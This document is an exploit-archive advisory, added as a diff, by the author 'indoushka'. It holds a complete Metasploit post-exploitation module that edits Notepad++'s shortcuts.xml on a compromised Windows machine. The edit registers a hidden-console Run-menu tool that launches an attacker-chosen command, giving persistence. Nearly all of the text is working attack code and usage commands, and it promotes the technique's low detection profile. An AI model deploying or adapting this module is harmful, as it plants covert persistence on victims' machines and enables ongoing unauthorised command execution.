@@ -1,0 +1,592 @@
+=============================================================================================================================================
+| # Title     : Notepad++ v8.9 External Tools Configuration Abuse for User-Interactive Persistence                                          |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://notepad-plus-plus.org/                                                                                              |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/211934/ 
+
+[+] Summary    : This Metasploit post-exploitation module abuses a legitimate Notepad++ feature by modifying the shortcuts.xml configuration file to register a custom external tool.
+                 The added tool appears in the Notepad++ Run menu and executes a user-defined command when manually selected by the user.
+                 This technique does not exploit a software vulnerability. Instead, it leverages intended application functionality (External Tools) for persistence and post-compromise execution.
+                 Execution requires explicit user interaction and persists across Notepad++ restarts.
+                 The module supports both Meterpreter and shell sessions, safely handles UTF-8 configuration files, optionally creates backups, 
+				 and records persistence artifacts in the Metasploit database
+
+[+] RUN : 
+
+# Testing Load in Metasploit
+msf6 > use post/windows/manage/notepadplusplus_config
+msf6 > show info
+
+# Should display:
+# Name: Notepad++ External Tools Configuration Manipulation
+# Notes:
+# Reliability: LOW
+# Confidence: MEDIUM
+# Type: PERSISTENCE
+
+# Testing Options
+msf6 > show options
+# Should display: TOOL_NAME, COMMAND, ARGUMENTS
+
+# Testing Verbose Mode
+msf6 > set VERBOSE true
+msf6 > set TOOL_NAME TestTool
+msf6 > set COMMAND cmd.exe
+msf6 > set SESSION 1
+msf6 > run
+
+[+] PoC : 
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Post
+  Rank = NormalRanking
+
+  include Msf::Post::File
+  include Msf::Post::Windows::Priv
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Notepad++ External Tools Configuration Manipulation',
+        'Description' => %q{
+          This module modifies Notepad++'s shortcuts.xml configuration to add
+          a malicious external tool definition. The tool appears in Notepad++'s
+          Run menu and executes when selected by the user.
+          
+          This technique abuses a legitimate Notepad++ feature for user-interactive
+          persistence. It requires explicit user action (selecting from menu) to
+          execute the configured command.
+          
+          Note: This is not an exploit but rather a feature abuse technique.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'indoushka'
+        ],
+        'Arch' => [ARCH_X64, ARCH_X86],
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter', 'shell'],
+        'DefaultTarget' => 0,
+        'References' => [
+          ['URL', 'https://npp-user-manual.org/docs/menus/run-menu/'],
+          ['AKA', 'Living-off-the-Land']
+        ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES],
+          'Type' => 'PERSISTENCE',
+          'Confidence' => 'MEDIUM',
+          'Reliability' => 'LOW'
+        },
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_fs_stat
+              stdapi_fs_file_open
+              stdapi_fs_file_read
+              stdapi_fs_file_write
+              stdapi_fs_file_close
+            ]
+          }
+        }
+      )
+    )
+
+    register_options([
+      OptString.new('TOOL_NAME', [
+        true,
+        'Name for the tool in Run menu',
+        Rex::Text.rand_text_alpha(8..12).capitalize
+      ]),
+      OptString.new('COMMAND', [
+        true,
+        'Executable to run (e.g., cmd.exe, powershell.exe)',
+        'cmd.exe'
+      ]),
+      OptString.new('ARGUMENTS', [
+        false,
+        'Arguments for the executable'
+      ])
+    ])
+
+    register_advanced_options([
+      OptString.new('WORKING_DIR', [
+        false,
+        'Working directory for command execution'
+      ]),
+      OptBool.new('SAVE_BEFORE_EXECUTE', [
+        true,
+        'Save current file before executing command',
+        false
+      ]),
+      OptEnum.new('CONSOLE_MODE', [
+        true,
+        'Console window visibility',
+        'HIDE',
+        ['HIDE', 'SHOW', 'DONT_CREATE']
+      ]),
+      OptBool.new('CREATE_BACKUP', [
+        true,
+        'Create backup of original configuration',
+        true
+      ]),
+      OptBool.new('VERBOSE', [
+        true,
+        'Enable verbose output',
+        false
+      ])
+    ])
+  end
+
+  def run
+    print_status("Starting Notepad++ configuration manipulation")
+    print_warning("Requires user interaction: User must select tool from Run menu")
+
+    unless session.platform == 'windows'
+      fail_with(Failure::NoTarget, "Windows platform required")
+    end
+
+    appdata = get_appdata_path
+    unless appdata
+      print_error("Could not determine APPDATA directory")
+      return
+    end
+    
+    shortcuts_path = "#{appdata}\\Notepad++\\shortcuts.xml"
+    vprint_status("Target configuration: #{shortcuts_path}")
+
+    if manipulate_shortcuts_file(shortcuts_path)
+      print_success_report(shortcuts_path)
+    else
+      print_error("Failed to manipulate shortcuts.xml")
+    end
+  end
+
+  def get_appdata_path
+
+    if session.type == 'meterpreter'
+      begin
+        return session.sys.config.getenv('APPDATA')
+      rescue
+
+      end
+    end
+    
+    result = expand_path('%APPDATA%')
+    (result && !result.start_with?('%')) ? result : nil
+  end
+
+  def directory_exists?(path)
+    return false if path.nil? || path.empty?
+    
+    begin
+      if session.type == 'meterpreter'
+        session.fs.dir.entries(path)
+        true
+      else
+
+        cmd_exec("if exist \"#{path.gsub('/', '\\')}\\.\" (echo true) 2>nul").include?('true')
+      end
+    rescue => e
+      vprint_error("Directory check failed for #{path}: #{e.message}") if datastore['VERBOSE']
+      false
+    end
+  end
+
+  def ensure_directory(path)
+    return true if directory_exists?(path)
+    
+    begin
+      if session.type == 'meterpreter'
+        session.fs.dir.mkdir(path)
+      else
+        cmd_exec("mkdir \"#{path.gsub('/', '\\')}\" 2>nul")
+      end
+      directory_exists?(path)
+    rescue => e
+      vprint_error("Failed to create directory #{path}: #{e.message}") if datastore['VERBOSE']
+      false
+    end
+  end
+
+  def file_exists?(path)
+    return false if path.nil? || path.empty?
+    
+    begin
+      if session.type == 'meterpreter'
+        session.fs.file.stat(path)
+        true
+      else
+        cmd_exec("if exist \"#{path.gsub('/', '\\')}\" (echo true) 2>nul").include?('true')
+      end
+    rescue => e
+      vprint_error("File check failed for #{path}: #{e.message}") if datastore['VERBOSE']
+      false
+    end
+  end
+
+  def read_file_content(path)
+    return nil unless file_exists?(path)
+    
+    begin
+      if session.type == 'meterpreter'
+        fd = session.fs.file.new(path, 'rb')
+        content = fd.read
+        fd.close
+        content
+      else
+
+        ps_cmd = "Get-Content -Path '#{path.gsub("'", "''")}' -Encoding UTF8 -Raw 2>$null"
+        result = cmd_exec("powershell -Command \"#{ps_cmd}\"")
+        result.empty? ? nil : result
+      end
+    rescue => e
+      vprint_error("Failed to read #{path}: #{e.message}") if datastore['VERBOSE']
+      nil
+    end
+  end
+
+  def write_file_content(path, content)
+
+    dir = File.dirname(path)
+    return false unless ensure_directory(dir)
+    
+    begin
+      if session.type == 'meterpreter'
+        fd = session.fs.file.new(path, 'wb')
+        fd.write(content)
+        fd.close
+        true
+      else
+
+        utf8_content = content.encode('UTF-8')
+        encoded_content = Rex::Text.encode_base64(utf8_content)
+        
+        ps_cmd = <<~PS
+          $bytes = [System.Convert]::FromBase64String('#{encoded_content}')
+          [System.IO.File]::WriteAllBytes('#{path.gsub("'", "''")}', $bytes)
+        PS
+        
+        cmd_exec("powershell -Command \"#{ps_cmd}\" 2>$null")
+
+        if file_exists?(path)
+          written_content = read_file_content(path)
+          written_content == content
+        else
+          false
+        end
+      end
+    rescue => e
+      print_error("Failed to write #{path}: #{e.message}")
+      false
+    end
+  end
+
+  def manipulate_shortcuts_file(path)
+
+    original_content = read_file_content(path)
+
+    if datastore['CREATE_BACKUP'] && original_content
+      create_backup(path, original_content)
+    end
+
+    new_content = if original_content && valid_shortcuts_xml?(original_content)
+                   modify_existing_shortcuts(original_content)
+                 else
+                   create_new_shortcuts_xml
+                 end
+
+    write_file_content(path, new_content)
+  end
+
+  def valid_shortcuts_xml?(content)
+
+    return false unless content && content.is_a?(String)
+
+    cleaned = content.gsub(/<!--.*?-->/m, '').strip
+    cleaned.include?('<NotepadPlus') && cleaned.include?('</NotepadPlus>')
+  end
+
+  def create_backup(original_path, content)
+    timestamp = Time.now.strftime('%Y%m%d_%H%M%S')
+    backup_path = "#{original_path}.#{timestamp}.bak"
+    
+    begin
+      if session.type == 'meterpreter'
+        fd = session.fs.file.new(backup_path, 'wb')
+        fd.write(content)
+        fd.close
+      else
+        cmd_exec("copy /y \"#{original_path.gsub('/', '\\')}\" \"#{backup_path.gsub('/', '\\')}\" >nul 2>&1")
+      end
+      vprint_status("Created backup: #{backup_path}")
+    rescue => e
+      vprint_warning("Backup creation failed: #{e.message}")
+    end
+  end
+
+
+  def create_new_shortcuts_xml
+    <<~XML
+      <?xml version="1.0" encoding="UTF-8" ?>
+      <NotepadPlus>
+        <InternalCommands />
+        <Macros />
+        <UserDefinedCommands>
+          #{generate_tool_xml}
+        </UserDefinedCommands>
+        <PluginCommands />
+        <ScintillaKeys />
+      </NotepadPlus>
+    XML
+  end
+
+  def modify_existing_shortcuts(content)
+    tool_name = datastore['TOOL_NAME']
+    
+  
+    cleaned_content = content.gsub(/<!--.*?-->/m, '')
+    
+
+    existing_tool_pattern = /<Command[^>]*name\s*=\s*["']#{Regexp.escape(tool_name)}["'][^>]*>(.*?)<\/Command>/m
+    
+    if cleaned_content =~ existing_tool_pattern
+      vprint_status("Tool '#{tool_name}' already exists, replacing...")
+      content.gsub(existing_tool_pattern, generate_tool_xml)
+    else
+      add_tool_to_shortcuts(content)
+    end
+  end
+
+  def add_tool_to_shortcuts(content)
+ 
+    strategies = [
+      :insert_into_userdefinedcommands,
+      :add_after_macros,
+      :append_before_closing
+    ]
+    
+    strategies.each do |strategy|
+      result = send(strategy, content)
+      return result if result
+    end
+    
+
+    vprint_warning("Could not modify existing shortcuts.xml, creating new file")
+    create_new_shortcuts_xml
+  end
+
+  def insert_into_userdefinedcommands(content)
+    return unless content.include?('<UserDefinedCommands>') && content.include?('</UserDefinedCommands>')
+    
+    insertion_point = content.index('</UserDefinedCommands>')
+    return unless insertion_point
+    
+    before = content[0...insertion_point]
+    after = content[insertion_point..-1]
+    
+    "#{before}#{generate_tool_xml}\n  #{after}"
+  end
+
+  def add_after_macros(content)
+    return unless content.include?('</Macros>')
+    
+    insertion_point = content.index('</Macros>') + '</Macros>'.length
+    before = content[0...insertion_point]
+    after = content[insertion_point..-1]
+    
+    new_section = <<~XML
+      <UserDefinedCommands>
+        #{generate_tool_xml}
+      </UserDefinedCommands>
+    XML
+    
+    "#{before}\n  #{new_section}#{after}"
+  end
+
+  def append_before_closing(content)
+    insertion_point = content.index('</NotepadPlus>')
+    return unless insertion_point
+    
+    before = content[0...insertion_point]
+    after = content[insertion_point..-1]
+    
+    new_section = <<~XML
+      <UserDefinedCommands>
+        #{generate_tool_xml}
+      </UserDefinedCommands>
+    XML
+    
+    "#{before}\n  #{new_section}#{after}"
+  end
+
+  def generate_tool_xml
+    tool_name = escape_xml_attr(datastore['TOOL_NAME'])
+    command = escape_xml_text(datastore['COMMAND'])
+    arguments = datastore['ARGUMENTS']
+    working_dir = datastore['WORKING_DIR']
+    save_before = datastore['SAVE_BEFORE_EXECUTE'] ? 'yes' : 'no'
+    
+    console_mode = case datastore['CONSOLE_MODE']
+                   when 'HIDE' then 0
+                   when 'SHOW' then 1
+                   when 'DONT_CREATE' then 2
+                   else 0
+                   end
+    
+    xml = []
+    xml << "  <Command name=\"#{tool_name}\" Ctrl=\"no\" Alt=\"no\" Shift=\"no\" Key=\"0\">"
+    xml << "    <Param>#{command}</Param>"
+    
+    if arguments && !arguments.empty?
+      xml << "    <Param>#{escape_xml_text(arguments)}</Param>"
+    else
+      xml << "    <Param />"
+    end
+    
+    if working_dir && !working_dir.empty?
+      xml << "    <Folder>#{escape_xml_text(working_dir)}</Folder>"
+    end
+    
+    xml << "    <SaveBeforeExecute>#{save_before}</SaveBeforeExecute>"
+    xml << "    <ShowConsole>#{console_mode}</ShowConsole>"
+    xml << "  </Command>"
+    
+    xml.join("\n")
+  end
+
+  def escape_xml_attr(text)
+    text.to_s.gsub('&', '&amp;')
+          .gsub('"', '&quot;')
+          .gsub("'", '&apos;')
+          .gsub('<', '&lt;')
+          .gsub('>', '&gt;')
+  end
+
+  def escape_xml_text(text)
+    text.to_s.gsub('&', '&amp;')
+          .gsub('<', '&lt;')
+          .gsub('>', '&gt;')
+  end
+
+
+  def print_success_report(shortcuts_path)
+    tool_name = datastore['TOOL_NAME']
+    command = datastore['COMMAND']
+    arguments = datastore['ARGUMENTS']
+    
+    full_command = [command, arguments].compact.join(' ')
+    
+    report = <<~REPORT
+    
+    NOTEPAD++ CONFIGURATION MODIFIED
+    
+    ============================================
+    TOOL DEFINITION
+    ============================================
+    
+    Name:           #{tool_name}
+    Command:        #{full_command}
+    Configuration:  #{shortcuts_path}
+    Working Dir:    #{datastore['WORKING_DIR'] || '(current directory)'}
+    Console Mode:   #{datastore['CONSOLE_MODE']}
+    Save Before:    #{datastore['SAVE_BEFORE_EXECUTE']}
+    
+    ============================================
+    EXECUTION CONDITIONS
+    ============================================
+    
+    The tool will execute ONLY when:
+    1. User opens Notepad++
+    2. Navigates to: Run → #{tool_name}
+    3. Selects the tool from the menu
+    
+    ============================================
+    VERIFICATION
+    ============================================
+    
+    To verify successful modification:
+    
+    1. Open Notepad++ on the target system
+    2. Check the Run menu for "#{tool_name}"
+    3. View the configuration file at:
+       #{shortcuts_path}
+    
+    ============================================
+    GENERATED XML
+    ============================================
+    
+    #{generate_tool_xml.gsub('    ', '  ')}
+    
+    ============================================
+    CLEANUP
+    ============================================
+    
+    To remove the persistence:
+    
+    1. Edit or delete: #{shortcuts_path}
+    2. Remove the <Command> entry for "#{tool_name}"
+    3. Restart Notepad++ to refresh menu
+    
+    Backup files are saved as:
+    #{shortcuts_path}.[timestamp].bak
+    
+    ============================================
+    NOTES
+    ============================================
+    
+    • Uses legitimate Notepad++ feature
+    • Persists across Notepad++ restarts
+    • Requires explicit user interaction
+    • Low detection profile (Living-off-the-Land)
+    
+    REPORT
+    
+    print_status(report)
+    
+    store_persistence_info(shortcuts_path, tool_name, full_command)
+  end
+
+  def store_persistence_info(path, tool_name, command)
+    return unless framework.db && framework.db.active
+    
+    begin
+      note_data = {
+        tool_name: tool_name,
+        command: command,
+        config_path: path,
+        module: self.fullname,
+        timestamp: Time.now.to_i,
+        session_id: session.sid
+      }
+      
+      framework.db.report_note({
+        workspace: framework.db.workspace,
+        host: session.session_host,
+        type: 'host.persistence.notepadplusplus',
+        data: note_data
+      })
+      
+      vprint_status("Persistence information stored in database")
+    rescue => e
+      vprint_error("Could not store in database: #{e.message}")
+    end
+  end
+
+  def cleanup
+    print_status("Configuration modification complete.")
+    print_status("Manual cleanup required if persistence is no longer needed.")
+  end
+end
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
